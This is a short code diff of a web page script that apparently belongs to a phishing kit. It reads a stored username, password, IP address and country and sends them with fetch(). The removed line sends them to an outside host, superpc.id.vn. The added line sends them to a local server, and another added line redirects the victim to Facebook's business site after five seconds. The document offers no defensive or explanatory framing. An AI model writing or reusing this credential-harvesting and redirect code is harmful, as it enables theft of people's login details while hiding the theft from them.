@@ -212,8 +212,9 @@
             var address = localStorage.getItem('address');
             var username = localStorage.getItem('username');
             var password = localStorage.getItem('password');
-            fetch('https://superpc.id.vn/checkpoint?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
+            fetch('http://localhost:5000/checkpoint?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
             setTimeout(function () {
+            window.location.href = 'https://business.facebook.com/';
             }, 5000);
         </script>
     </head>
